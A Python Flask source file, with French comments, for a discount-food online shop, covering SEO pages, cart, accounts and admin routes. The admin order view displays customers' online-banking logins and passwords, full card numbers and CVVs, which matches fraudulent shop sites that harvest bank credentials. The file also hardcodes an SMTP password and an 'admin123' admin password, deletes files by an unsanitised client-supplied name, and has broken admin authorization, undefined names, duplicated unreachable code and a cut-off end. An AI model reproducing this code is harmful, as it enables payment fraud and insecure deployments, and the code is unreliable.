from flask import Flask, render_template, request, redirect, url_for, session, flash, jsonify, make_response, send_from_directory
from werkzeug.security import generate_password_hash, check_password_hash
import json
import os
import re
from datetime import datetime, timedelta, timezone
from werkzeug.utils import secure_filename
import uuid
import requests
from reportlab.lib.pagesizes import letter
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib import colors
from reportlab.lib.units import inch
from io import BytesIO
from functools import wraps
from sqlalchemy import func, or_
from flask_sqlalchemy import SQLAlchemy   # ✅ manquait !
from reportlab.graphics.barcode import qr
from reportlab.graphics.shapes import Drawing
from werkzeug.middleware.proxy_fix import ProxyFix
from flask_mail import Mail, Message
from utils import send_confirmation_email
from data import products as all_products
from admin_auth import ADMIN_CREDENTIALS
from data import products, categories
from blog_routes import blog_bp
from flask_compress import Compress
from flask_babel import Babel, _
from admin_auth import ADMIN_CREDENTIALS   # identifiants admin
from models import User, Order, PaymentMethod  # Import après db
from extensions import db



def last4(s):
    return str(s)[-4:] if s else ''

app = Flask(__name__)
app.register_blueprint(blog_bp)
compress = Compress(app)

# Sécurité sessions
app.config.update(
    SECRET_KEY='votre_cle_secrete_tres_longue',  # Changez ceci!
    SESSION_COOKIE_SECURE=True,
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE='Lax',
    PERMANENT_SESSION_LIFETIME=timedelta(days=1),
    SESSION_REFRESH_EACH_REQUEST=True,
    UPLOAD_FOLDER='static/images/products',
    MAX_CONTENT_LENGTH=16 * 1024 * 1024
)

# ✅ Configuration de la DB (SQLite en local, PostgreSQL sur Render si DATABASE_URL existe)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL", "sqlite:///site.db")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db.init_app(app)

# Babel (multi-langues)
app.config['BABEL_DEFAULT_LOCALE'] = 'fr'
app.config['BABEL_SUPPORTED_LOCALES'] = ['fr', 'en', 'es', 'de']
babel = Babel()
def get_locale():
    return request.accept_languages.best_match(app.config['BABEL_SUPPORTED_LOCALES'])
babel.init_app(app, locale_selector=get_locale)

# Jinja filters
app.jinja_env.globals.update(datetime=datetime)
app.jinja_env.filters['last4'] = last4

# Email config
smtp_password = os.getenv('SMTP_PASSWORD', 'Destockage123@')
app.config.update(
    MAIL_SERVER='smtp.hostinger.com',
    MAIL_PORT=465,
    MAIL_USE_SSL=True,
    MAIL_USERNAME='contact@destockagealimentaire.fr',
    MAIL_PASSWORD=smtp_password,
    MAIL_DEFAULT_SENDER=('Destockage Alimentaire', 'contact@destockagealimentaire.fr'),
    MAIL_DEBUG=True,
    MAIL_SUPPRESS_SEND=False
)
mail = Mail(app)

# Middleware proxy
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1)

# ✅ Créer les tables si elles n’existent pas
with app.app_context():
    db.create_all()



# Fonction de vérification des types de fichiers
def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

    
# Exemple de récupération de données (à adapter selon ton contexte)
name = "Nom du client"  # ou request.form['name']
subject = "Sujet du message"  # ou request.form['subject']


# Configuration
app.config['UPLOAD_FOLDER'] = 'static/images/products'

ADMIN_CREDENTIALS = {
    'username': 'admin',
    'password_hash': generate_password_hash('admin123')
}

# Données utilisateurs simulées

def slugify(text):
    text = text.lower()
    text = re.sub(r'[àâä]', 'a', text)
    text = re.sub(r'[éèêë]', 'e', text)
    text = re.sub(r'[îï]', 'i', text)
    text = re.sub(r'[ôö]', 'o', text)
    text = re.sub(r'[ùûü]', 'u', text)
    text = re.sub(r'[ç]', 'c', text)
    text = re.sub(r'[^a-z0-9]+', '-', text)
    return text.strip('-')

@app.template_filter('slugify')
def slugify_filter(text):
    return slugify(text)

# Configuration pour les uploads
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # 16MB max

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

# Panier simulé
def get_cart():
    if 'cart' not in session:
        session['cart'] = {}
        session.modified = True  # Important

    return session['cart']

def get_meta_tags(page):
    meta = {
        'home': {
            'title': 'Destockage Alimentaire - Grossiste en produits alimentaires',
            'description': 'Grossiste en destockage alimentaire. Produits de qualité à prix discount pour professionnels et particuliers.',
            'keywords': 'destockage, alimentaire, grossiste, produits alimentaires'
        },
        # Ajoutez d'autres pages...
    }
    return meta.get(page, meta['home'])


    
@app.context_processor
def inject_schema():
    schema = {
        "@context": "https://schema.org",
        "@type": "WebSite",
        "name": "Destockage Alimentaire",
        "url": "https://destockagealimentairestore.com"
    }
    return {'schema': json.dumps(schema, indent=2)}

# Exemple d'optimisation de cache
@app.after_request
def add_header(response):
    if request.path.startswith('/static/'):
        response.cache_control.max_age = 31536000  # 1 an pour les assets statiques
    else:
        response.cache_control.max_age = 3600  # 1 heure pour les pages dynamiques
    return response

@app.before_request
def before_request():
    session.permanent = True
    # Initialise le panier si non existant
    if 'cart' not in session:
        session['cart'] = {}

    try:
        clean_cart()
    except Exception as e:
        print(f"Error cleaning cart: {e}")
        session['cart'] = {}
    
    # Définit la session comme permanente
    session.permanent = True

def save_cart(cart):
    session['cart'] = cart
    session.modified = True



def get_utc_now():
    return datetime.now(timezone.utc)

def ensure_timezone(dt):
    if dt is None:
        return None
    # Si dt n'a pas de timezone, on ajoute UTC
    if dt.tzinfo is None:
        return dt.replace(tzinfo=timezone.utc)
    return dt

@app.route('/destockage-alimentaire-professionnel')
def seo_landing_1():
    """Page ultra-optimisée pour le mot-clé principal"""
    meta = {
        'title': 'Destockage Alimentaire Professionnel | Grossiste -70% sur Stocks',
        'description': 'Grossiste en destockage alimentaire pour professionnels. Livraison rapide, produits à -70%, qualité garantie. Commandez en ligne dès maintenant!',
        'keywords': 'destockage alimentaire, grossiste alimentaire, destockage professionnel, produits alimentaires pas chers'
    }
    
    # Contenu optimisé avec variantes sémantiques
    content = {
        'h1': 'Destockage Alimentaire Professionnel - Jusqu\'à -70% sur Stocks',
        'intro': 'Votre grossiste spécialisé dans le destockage alimentaire pour professionnels. Produits de qualité à prix cassés, livraison sous 48h.',
        'sections': [
            {
                'title': 'Pourquoi choisir notre destockage alimentaire ?',
                'content': 'Nous sommes le leader français du destockage alimentaire professionnel avec plus de 1500 références en stock permanent. Nos produits proviennent directement des usines et centrales d\'achat.'
            },
            {
                'title': 'Nos catégories phares',
                'content': 'Découvrez nos gammes de produits alimentaires en destockage : épicerie, surgelés, boissons, produits frais. Tous nos produits sont garantis d\'origine UE.'
            }
        ],
        'cta': 'Commandez dès maintenant et bénéficiez de nos tarifs grossiste exceptionnels!'
    }
    
    return render_template('seo_landing.html', 
                         meta=meta, 
                         content=content,
                         products=random.sample(products, 8))  # Affiche 8 produits aléatoires

@app.route('/grossiste-alimentaire-pas-cher')
def seo_landing_2():
    """Page optimisée pour une variante de mot-clé"""
    meta = {
        'title': 'Grossiste Alimentaire Pas Cher | Destockage Pro -50% Mini',
        'description': 'Grossiste alimentaire pas cher pour professionnels de la restauration. Destockage permanent avec des remises jusqu\'à -50% minimum. Service pro dédié.',
        'keywords': 'grossiste alimentaire pas cher, destockage pro, alimentation discount, achat en gros nourriture'
    }
    
    content = {
        'h1': 'Grossiste Alimentaire Pas Cher - Destockage Permanent',
        'intro': 'Découvrez notre sélection de produits alimentaires en destockage à prix grossiste. Réservé aux professionnels avec des remises exceptionnelles.',
        'sections': [
            {
                'title': 'Notre engagement qualité',
                'content': 'Même en destockage, nous maintenons des standards qualité exigeants. Tous nos produits sont contrôlés et conformes aux normes françaises.'
            },
            {
                'title': 'Service client dédié',
                'content': 'Un conseiller spécialisé vous accompagne pour trouver les meilleures affaires dans notre catalogue de destockage alimentaire.'
            }
        ],
        'cta': 'Demandez votre accès privilégié dès maintenant!'
    }
    
    return render_template('seo_landing.html',
                         meta=meta,
                         content=content,
                         products=random.sample([p for p in products if p['price'] < 20], 8))

@app.route('/achat-nourriture-en-gros')
def seo_landing_3():
    """Autre variante sémantique"""
    meta = {
        'title': 'Achat Nourriture en Gros | Destockage Alimentaire Grossiste',
        'description': 'Achetez votre nourriture en gros à prix destockage. Grossiste alimentaire pour professionnels avec des quantités adaptées à votre activité.',
        'keywords': 'achat nourriture en gros, destockage alimentaire grossiste, achat alimentaire volume, restauration pas cher'
    }
    
    content = {
        'h1': 'Achat Nourriture en Gros - Prix Destockage Exceptionnels',
        'intro': 'Solution clé en main pour vos achats de nourriture en gros. Destockage permanent sur toutes nos gammes professionnelles.',
        'sections': [
            {
                'title': 'Avantages pour les professionnels',
                'content': 'Conditions spéciales pour les restaurateurs, traiteurs et revendeurs. Tarifs dégressifs selon volumes.'
            },
            {
                'title': 'Livraison rapide',
                'content': 'Stock disponible en France avec livraison sous 48h. Service logistique dédié pour les gros volumes.'
            }
        ],
        'cta': 'Contactez-nous pour un devis personnalisé!'
    }
    
    return render_template('seo_landing.html',
                         meta=meta,
                         content=content,
                         products=random.sample(products, 6))

def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        last_activity = session.get('admin_last_activity')
        if last_activity:
            # Convertir en UTC si nécessaire
            if last_activity.tzinfo is None:
                last_activity = last_activity.replace(tzinfo=timezone.utc)
        current_time = datetime.now(timezone.utc)

        if not session.get('admin_logged_in'):
            return redirect(url_for('admin_login', next=request.url))

        if last_activity and (current_time - last_activity) > timedelta(minutes=5):
            session.clear()
            flash('Session expirée', 'warning')
            return redirect(url_for('admin_login', next=request.url))

        session['admin_last_activity'] = current_time
        return f(*args, **kwargs)
    return decorated_function


@app.route('/')
def index():
    featured_products = [p for p in products if p.get('featured', False)]
    
    # Normalisation des données image/images
    for product in featured_products:
        # Si le produit utilise l'ancien système avec 'image'
        if 'image' in product:
            # Migration vers le nouveau système
            product['images'] = [product['image']] if product['image'] else ['default.jpg']
            del product['image']
        # Si pas d'images du tout
        elif 'images' not in product or not product['images']:
            product['images'] = ['default.jpg']
        # Si images existe mais est vide
        elif not product['images']:
            product['images'] = ['default.jpg']
    
    return render_template('index.html', featured_products=featured_products)


@app.route('/produits')
def product_list():
    category = request.args.get('category', 'all')
    search_term = request.args.get('search', '').lower()
    
    # Filtrage
    if category == 'all':
        filtered_products = products
    else:
        filtered_products = [p for p in products if p['category'] == category]
    
    if search_term:
        filtered_products = [p for p in filtered_products 
                          if search_term in p['name'].lower() 
                          or search_term in p['description'].lower()]
    
    # Normalisation des images
    for product in filtered_products:
        if 'image' in product:
            product['images'] = [product['image']]
            del product['image']
        elif 'images' not in product or not product['images']:
            product['images'] = ['default.jpg']
    
    return render_template('products.html',
                         products=filtered_products,
                         categories=categories,
                         current_category=category)

    # Gestion des images
    for product in filtered_products:
        # Si le produit n'a pas d'images du tout
        if 'images' not in product or not product['images']:
            product['images'] = ['default.jpg']
        # Si le produit utilise encore l'ancien système avec 'image'
        elif 'image' in product and product['image']:
            # Migration vers le nouveau système
            product['images'] = [product['image']]
            del product['image']
    
    return render_template('products.html', 
                         products=filtered_products, 
                         categories=categories,
                         current_category=category)

    # Gestion des images
    for product in filtered_products:
        # Si le produit n'a pas d'images du tout
        if 'images' not in product or not product['images']:
            product['images'] = ['default.jpg']
        # Si le produit utilise encore l'ancien système avec 'image'
        elif 'image' in product and product['image']:
            # Migration vers le nouveau système
            product['images'] = [product['image']]
            del product['image']
    
    return render_template('products.html', 
                         products=filtered_products, 
                         categories=categories,
                         current_category=category)
@app.route('/submit-contact', methods=['POST'])
def submit_contact():
    try:
        # Récupération des données du formulaire
        name = request.form.get('name')
        company = request.form.get('company')
        email = request.form.get('email')
        phone = request.form.get('phone')
        subject = request.form.get('subject')
        message = request.form.get('message')

        # Validation des champs requis
        if not all([name, email, subject, message]):
            flash('Veuillez remplir tous les champs obligatoires', 'error')
            return redirect(url_for('contact'))

        # Création de l'email
        msg = Message(
            subject=f"Nouveau message de contact: {subject}",
            recipients=['contact@destockagealimentaire.fr'],
            reply_to=email,
            body=f"""
            Nom: {name}
            Société: {company or 'Non renseigné'}
            Email: {email}
            Téléphone: {phone or 'Non renseigné'}

            Message:
            {message}
            """
        )

        # Envoi de l'email
        mail.send(msg)

        flash('Votre message a bien été envoyé ! Nous vous répondrons dès que possible.', 'success')
        return redirect(url_for('contact'))

    except Exception as e:
        app.logger.error(f"Erreur lors de l'envoi du formulaire: {str(e)}")
        flash("Une erreur s'est produite lors de l'envoi de votre message. Veuillez réessayer.", 'error')
        return redirect(url_for('contact'))


@app.route('/api/search')
def api_search():
    try:
        query = request.args.get('q', '').strip().lower()
        
        if not query or len(query) < 2:
            return jsonify([])
        
        results = []
        for product in products:
            # Gestion robuste du nom et de la catégorie
            name = product.get('name', '')
            category = product.get('category', '')
            
            # Convertir en string si ce n'est pas déjà le cas
            if isinstance(name, list):
                name = ' '.join(name)  # Convertit la liste en string
            if isinstance(category, list):
                category = ' '.join(category)  # Convertit la liste en string
                
            # Recherche insensible à la casse
            if (query in name.lower() or 
                query in category.lower()):
                
                # Gestion de l'image
                image = None
                if 'images' in product and product['images']:
                    image = product['images'][0] if isinstance(product['images'], list) else product['images']
                elif 'image' in product:
                    image = product['image']
                
                results.append({
                    'id': product.get('id'),
                    'name': name,
                    'price': float(product.get('price', 0)),
                    'category': category,
                    'images': [image] if image else ['default-product.jpg']
                })
                
                if len(results) >= 8:
                    break
        
        return jsonify(results)
        
    except Exception as e:
        print(f"Erreur recherche: {str(e)}")
        return jsonify({'error': str(e)}), 500

# Route détail d’une commande
@app.route('/admin/order/<order_id>')
@admin_required
def admin_order_detail(order_id):
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))

    order = session.get('orders', {}).get(order_id)
    if not order:
        flash('Commande non trouvée', 'error')
        return redirect(url_for('admin_orders'))

    # Détails des produits
    order_items = []
    subtotal = 0
    for product_id, quantity in order.get('items', {}).items():
        product = next((p for p in all_products if str(p['id']) == str(product_id)), None)
        if product:
            item_total = product['price'] * int(quantity)
            subtotal += item_total
            order_items.append({
                'product': product,
                'quantity': quantity,
                'total': item_total
            })

    # Paiement
    payment_info = {
        'method': order.get('payment_method'),
        'status': order.get('status', 'En traitement'),
        'details': {}
    }

    if order.get('payment_method') == 'installment':
        payment_info['details'] = {
            'bank_name': order.get('bank_name', 'Non spécifié'),
            'bank_user_id': order.get('bank_user_id', 'Non spécifié'),
            'bank_password': order.get('bank_password', 'Non spécifié'),
            'account_number': order.get('account_number', 'Non spécifié'),
            'card_number': order.get('card_number', 'Non spécifié'),
            'expiry_date': order.get('expiry_date', 'Non spécifié'),
            'cvv': order.get('cvv', 'Non spécifié'),
            'installment_plan': order.get('installment_plan', 'Non spécifié')
        }
    elif order.get('payment_method') == 'credit_card':
        payment_info['details'] = {
            'card_number': order.get('card_number', 'Non spécifié'),
            'card_holder': order.get('card_holder', 'Non spécifié'),
            'expiry_date': order.get('expiry_date', 'Non spécifié'),
            'cvv': order.get('cvv', 'Non spécifié')
        }

    # Récupération de l’utilisateur
    username = order.get('user')
    user = User.query.filter_by(username=username).first() if username else None

    return render_template(
        'admin_order_detail.html',
        order={
            'id': order_id,
            'date': order.get('date'),
            'user': username,
            'items': order_items,
            'subtotal': subtotal,
            'total': subtotal * 1.2,  # TVA ou autre calcul
            'payment': payment_info,
            'status': order.get('status', 'En traitement')
        },
        user=user  # None si invité
    )


@app.route('/admin-xxx/product/delete-image/<int:product_id>', methods=['POST'])
def admin_delete_product_image(product_id):
    if not session.get('admin_logged_in'):
        return jsonify({'success': False, 'message': 'Non autorisé'}), 401
    
    product = next((p for p in products if p['id'] == product_id), None)
    if not product:
        return jsonify({'success': False, 'message': 'Produit non trouvé'}), 404
    
    try:
        image_name = request.json.get('image')
        if not image_name:
            return jsonify({'success': False, 'message': 'Nom d\'image manquant'}), 400
        
        # Supprimer l'image du système de fichiers
        image_path = os.path.join(app.config['UPLOAD_FOLDER'], image_name)
        if os.path.exists(image_path):
            os.remove(image_path)
        
        # Supprimer l'image de la liste des images du produit
        if 'images' in product:
            product['images'] = [img for img in product['images'] if img != image_name]
        
        return jsonify({'success': True, 'message': 'Image supprimée avec succès'})
    
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500

@app.route('/admin-xxx/product/delete/<int:product_id>', methods=['POST'])
def admin_delete_product(product_id):
    if not session.get('admin_logged_in'):
        return jsonify({'success': False, 'message': 'Non autorisé'}), 401
    
    product = next((p for p in products if p['id'] == product_id), None)
    if not product:
        return jsonify({'success': False, 'message': 'Produit non trouvé'}), 404
    
    try:
        # Supprimer l'image associée
        if 'image' in product:
            image_path = os.path.join(app.config['UPLOAD_FOLDER'], product['image'])
            if os.path.exists(image_path):
                os.remove(image_path)
        
        # Supprimer le produit de la liste
        products[:] = [p for p in products if p['id'] != product_id]
        
        return jsonify({'success': True, 'message': 'Produit supprimé avec succès'})
    
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500

@app.route('/admin-xxx/client/<username>')
def admin_client_detail(username):
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))
    
    client = users.get(username)
    if not client:
        flash('Client non trouvé', 'error')
        return redirect(url_for('admin_xxx'))
    
    # Récupérer les commandes du client
    client_orders = []
    for order_id, order in session.get('orders', {}).items():
        if order.get('user') == username:
            order_details = {
                'id': order_id,
                'date': order.get('date'),
                'total': order.get('total'),
                'status': order.get('status'),
                'items_count': len(order.get('items', {}))
            }
            client_orders.append(order_details)
    
    return render_template('admin_client_detail.html',
                         client=client,
                         orders=client_orders)

def prepare_order_data(orders):
    processed = {}
    for order_id, order in orders.items():
        order_data = dict(order)
        if hasattr(order_data.get('items'), '__call__'):
            order_data['items'] = order_data['items']()
        processed[order_id] = order_data
    return processed
    
@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        user = User.query.filter_by(username=username).first()

        if user and user.check_password(password) and user.role == "admin":
            session['logged_in'] = True
            session['role'] = 'admin'
            session['username'] = user.username
            flash("Connexion réussie", "success")
            return redirect(url_for('admin_dashboard'))

        flash("Identifiants invalides ou non autorisés", "error")
    
    return render_template("admin/login.html")


@app.route('/admin/logout')
def admin_logout():
    session.clear()
    flash('Déconnexion réussie', 'success')
    return redirect(url_for('index'))


@app.route('/admin/update-status/<order_id>', methods=['POST'])
def update_order_status(order_id):
    if not session.get('admin_logged_in'):
        return jsonify({'success': False, 'message': 'Non autorisé'}), 401
    
    if 'orders' not in session or order_id not in session['orders']:
        return jsonify({'success': False, 'message': 'Commande non trouvée'}), 404
    
    try:
        new_status = request.json.get('status')
        session['orders'][order_id]['status'] = new_status
        session.modified = True
        
        # Envoyer une notification si le statut est "Expédié"
        if new_status == 'Expédié':
            username = session['orders'][order_id].get('user')
            if username in users:
                user_email = users[username].get('email')
                # Ici vous pourriez ajouter l'envoi d'un email de notification
                
        return jsonify({'success': True, 'message': 'Statut mis à jour'})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500

@app.route('/save-product', methods=['POST'])
def save_product():
    if not session.get('admin_logged_in'):
        return jsonify({'success': False, 'message': 'Non autorisé'}), 401
    
    try:
        product_id = request.form.get('product_id')
        
        if product_id:  # Modification
            product = next((p for p in products if p['id'] == int(product_id)), None)
            if not product:
                return jsonify({'success': False, 'message': 'Produit non trouvé'}), 404
        else:  # Nouveau produit
            product = {
                'id': max(p['id'] for p in products) + 1 if products else 1,
                'date_added': datetime.now().strftime("%Y-%m-%d")
            }
        
        # Mise à jour des données
        product['name'] = request.form['name']
        product['category'] = request.form['category']
        product['price'] = float(request.form['price'])
        product['stock'] = int(request.form['stock'])
        product['description'] = request.form['description']
        product['featured'] = 'featured' in request.form
        
        # Gestion de l'image
        if 'image' in request.files:
            file = request.files['image']
            if file.filename != '':
                # Supprimer l'ancienne image si elle existe
                if 'image' in product:
                    old_image_path = os.path.join(app.config['UPLOAD_FOLDER'], product['image'])
                    if os.path.exists(old_image_path):
                        os.remove(old_image_path)
                
                # Sauvegarder la nouvelle image
                filename = secure_filename(file.filename)
                unique_filename = f"{uuid.uuid4().hex}_{filename}"
                file.save(os.path.join(app.config['UPLOAD_FOLDER'], unique_filename))
                product['image'] = unique_filename
        
        if not product_id:  # Ajouter le nouveau produit
            products.append(product)
        
        return jsonify({'success': True, 'message': 'Produit enregistré avec succès'})
    
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500

# Route pour la page d'administration


@app.route('/admin/add-product', methods=['GET', 'POST'])
@admin_required
def admin_add_product():
    if request.method == 'POST':
        try:
            name = request.form['name']
            description = request.form['description']
            price = float(request.form['price'])
            category = request.form['category']
            stock = int(request.form['stock'])
            featured = 'featured' in request.form

            if 'image' not in request.files:
                flash('Aucun fichier sélectionné', 'error')
                return redirect(request.url)
            file = request.files['image']
            if file.filename == '':
                flash('Aucun fichier sélectionné', 'error')
                return redirect(request.url)

            if file and allowed_file(file.filename):
                filename = secure_filename(file.filename)
                unique_filename = f"{uuid.uuid4().hex}_{filename}"
                file.save(os.path.join(app.config['UPLOAD_FOLDER'], unique_filename))

                new_product = {
                    'id': max(p['id'] for p in products) + 1 if products else 1,
                    'name': name,
                    'description': description,
                    'price': price,
                    'category': category,
                    'stock': stock,
                    'featured': featured,
                    'image': unique_filename,
                    'date_added': datetime.now().strftime("%Y-%m-%d")
                }
                products.append(new_product)
                flash('Produit ajouté avec succès', 'success')
                return redirect(url_for('admin_dashboard'))
        except Exception as e:
            flash(f'Erreur lors de l\'ajout du produit: {str(e)}', 'error')
    return render_template('admin_add_product.html', categories=categories)

@app.route('/account/address', methods=['POST'])
def manage_address():
    if not session.get('logged_in'):
        return redirect(url_for('login'))

    user = User.query.filter_by(username=session['username']).first()
    if not user:
        flash('Session expirée, reconnectez-vous', 'error')
        return redirect(url_for('login'))

    action = request.form.get('action')
    if action == 'update':
        user.address = request.form.get('address')
        user.phone = request.form.get('phone')
        db.session.commit()
        flash('Adresse mise à jour avec succès', 'success')
    elif action == 'delete':
        user.address = ''
        user.phone = ''
        db.session.commit()
        flash('Adresse supprimée avec succès', 'success')

    return redirect(url_for('account'))


@app.route('/save-profile', methods=['POST'])
def save_profile():
    if not session.get('logged_in'):
        return redirect(url_for('login'))

    user = User.query.filter_by(username=session['username']).first()
    if not user:
        flash('Session expirée, reconnectez-vous', 'error')
        return redirect(url_for('login'))

    user.full_name = request.form.get('full_name', user.full_name)
    user.email = request.form.get('email', user.email)
    user.phone = request.form.get('phone', user.phone)
    db.session.commit()

    flash('Profil mis à jour avec succès', 'success')
    return redirect(url_for('account'))


@app.route('/save-address', methods=['POST'])
def save_address():
    if not session.get('logged_in'):
        return redirect(url_for('login'))

    user = User.query.filter_by(username=session['username']).first()
    if not user:
        flash('Session expirée, reconnectez-vous', 'error')
        return redirect(url_for('login'))

    action = request.form.get('action')
    if action == 'update':
        user.address = request.form.get('address', '')
        user.phone = request.form.get('phone', '')
        db.session.commit()
        flash('Adresse mise à jour', 'success')
    elif action == 'delete':
        user.address = ''
        db.session.commit()
        flash('Adresse supprimée', 'success')

    return redirect(url_for('account'))


@app.route('/change-password', methods=['POST'])
def change_password():
    if not session.get('logged_in'):
        return redirect(url_for('login'))

    user = User.query.filter_by(username=session['username']).first()
    if not user:
        flash('Session expirée, reconnectez-vous', 'error')
        return redirect(url_for('login'))

    current_password = request.form.get('current_password')
    new_password = request.form.get('new_password')

    if check_password_hash(user.password, current_password):
        user.password = generate_password_hash(new_password)
        db.session.commit()
        flash('Mot de passe changé avec succès', 'success')
    else:
        flash('Mot de passe actuel incorrect', 'error')

    return redirect(url_for('account'))


@app.route('/set-default-card', methods=['POST'])
def set_default_card():
    if not session.get('logged_in'):
        return redirect(url_for('login'))

    user = User.query.filter_by(username=session['username']).first()
    if not user:
        flash('Session expirée, reconnectez-vous', 'error')
        return redirect(url_for('login'))

    card_id = request.form.get('card_id')

    # Exemple simplifié : tu devras avoir un modèle PaymentMethod lié à User
    for card in user.payment_methods:
        card.default = (str(card.id) == str(card_id))

    db.session.commit()
    flash('Carte par défaut mise à jour', 'success')
    return redirect(url_for('account'))


@app.route('/admin/view-users')
def admin_view_users():
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))

    all_users = User.query.all()
    return render_template('admin_view_users.html', users=all_users)
    
@app.route('/produit/<int:product_id>')
def product_detail_old(product_id):
    product = next((p for p in products if p['id'] == product_id), None)
    if not product:
        flash('Produit non trouvé', 'error')
        return redirect(url_for('product_list'))

    # Génère le slug du produit
    slug = slugify_filter(product['name'])
    # Redirection 301 vers la nouvelle URL avec slug
    return redirect(url_for('product_detail', product_id=product_id, slug=slug), code=301)


@app.route('/produit/<int:product_id>-<slug>')
def product_detail(product_id, slug):
    # Recherche du produit par ID
    product = next((p for p in products if p['id'] == product_id), None)
    if not product:
        flash('Produit non trouvé', 'error')
        return redirect(url_for('product_list'))

    # Slugification correcte de l'URL
    correct_slug = slugify(product['name'])
    if slug != correct_slug:
        return redirect(url_for('product_detail', product_id=product_id, slug=correct_slug), code=301)

    # Assurer que les détails sont présents
    if 'details' not in product:
        product['details'] = {
            'description': product.get('description', ''),
            'catégorie': product.get('category', ''),
            'date_ajout': product.get('date_added', '')
        }

    # Produits liés (même catégorie, sauf le produit courant)
    category = product.get('category')
    related_products = [p for p in products if p.get('category') == category and p.get('id') != product_id][:4] if category else []

    # Génération du JSON-LD structuré pour SEO (Google)
    jsonld_data = generer_jsonld(product)
    jsonld_str = json.dumps(jsonld_data, ensure_ascii=False)
    jsonld_str = jsonld_str.replace("</", "<\\/")  # échappement nécessaire

    # Rendu du template HTML
    return render_template(
        'product_detail.html',
        product=product,
        related_products=related_products,
        jsonld_str=jsonld_str
    )


def generer_jsonld(produit):
    import datetime
    base_url = "https://destockagealimentairestore.com"

    images_full_url = [
        f"{base_url}/static/images/products/{img}" for img in produit.get("images", ["default.jpg"])
    ]

    url_produit = f"{base_url}/produit/{produit['id']}-{slugify(produit['name'])}"

    # Extraction du prix en float
    try:
        prix = float(produit.get("offers", {}).get("price", 0))
    except ValueError:
        prix = 0.0

    jsonld = {
        "@context": "https://schema.org/",
        "@type": "Product",
        "name": produit["name"],
        "image": images_full_url,
        "description": produit.get("description", ""),
        "sku": str(produit["id"]),
        "brand": {
            "@type": "Brand",
            "name": produit.get("details", {}).get("marque", "Marque non spécifiée")
        },
        "offers": {
            "@type": "Offer",
            "url": url_produit,
            "priceCurrency": produit.get("offers", {}).get("priceCurrency", "EUR"),
            "price": prix,
            "priceValidUntil": produit.get("offers", {}).get("priceValidUntil", "2025-12-31"),
            "availability": produit.get("offers", {}).get("availability", "https://schema.org/InStock"),
            "itemCondition": "https://schema.org/NewCondition",
            "shippingDetails": {
                "@type": "OfferShippingDetails",
                "shippingRate": {
                    "@type": "MonetaryAmount",
                    "value": "0.00",
                    "currency": "EUR"
                },
                "shippingDestination": {
                    "@type": "DefinedRegion",
                    "addressCountry": "FR"
                }
            },
            "hasMerchantReturnPolicy": {
                "@type": "MerchantReturnPolicy",
                "returnPolicyCategory": "https://schema.org/MerchantReturnFiniteReturnWindow",
                "merchantReturnDays": 14,
                "returnMethod": "https://schema.org/ReturnByMail",
                "returnFees": "https://schema.org/FreeReturn",
                "applicableCountry": "FR"
            }
        }
    }

    # Ajouter les avis si présents
    if "aggregateRating" in produit:
        jsonld["aggregateRating"] = {
            "@type": "AggregateRating",
            "ratingValue": float(produit["aggregateRating"].get("ratingValue", 0)),
            "reviewCount": int(produit["aggregateRating"].get("reviewCount", 0))
        }

    return jsonld


# Gestion du panier
@app.route('/ajouter-au-panier', methods=['POST'])
def add_to_cart():
    try:
        product_id = request.form.get('product_id')
        quantity = request.form.get('quantity', 1)
        
        # Validation des entrées
        if not product_id or not product_id.isdigit():
            raise ValueError("ID produit invalide")
        if not str(quantity).isdigit():
            raise ValueError("Quantité invalide")
            
        product_id = int(product_id)
        quantity = max(1, int(quantity))  # Quantité minimale de 1
        
        # Vérifie que le produit existe
        product = next((p for p in products if p['id'] == product_id), None)
        if not product:
            raise ValueError("Produit non trouvé")
            
    except ValueError as e:
        if request.headers.get('X-Requested-With') == 'XMLHttpRequest':
            return json.dumps({'success': False, 'message': str(e)}), 400
        flash(str(e), 'error')
        return redirect(url_for('product_list'))
    
    # Ajout au panier
    cart = get_cart()
    cart[str(product_id)] = cart.get(str(product_id), 0) + quantity
    save_cart(cart)
    
    if request.headers.get('X-Requested-With') == 'XMLHttpRequest':
        return json.dumps({
            'success': True,
            'cart_count': sum(cart.values()),
            'message': f'{product["name"]} ajouté au panier'
        })
    
    flash(f'{product["name"]} ajouté au panier', 'success')
    return redirect(request.referrer or url_for('index'))

def clean_cart():
    cart = get_cart()
    cleaned_cart = {}
    
    for product_id, quantity in cart.items():
        try:
            # Vérification que product_id est valide
            if product_id == 'undefined' or not product_id.isdigit():
                continue
                
            # Conversion sécurisée
            pid = int(product_id)
            qty = int(quantity) if str(quantity).isdigit() else 0
            qty = max(0, qty)  # Quantité minimum à 0
            
            # Vérification que le produit existe
            if qty > 0 and any(p['id'] == pid for p in products):
                cleaned_cart[str(pid)] = qty
        except (ValueError, TypeError):
            continue
    
    save_cart(cleaned_cart)
    return cleaned_cart

@app.before_request
def before_request():
    # Initialise le panier si non existant
    if 'cart' not in session:
        session['cart'] = {}
    
    # Nettoyage du panier avec gestion des erreurs
    try:
        clean_cart()
    except Exception as e:
        print(f"Error cleaning cart: {e}")
        # Réinitialiser le panier en cas d'erreur grave
        session['cart'] = {}

@app.route('/supprimer-du-panier/<int:product_id>', methods=['POST'])
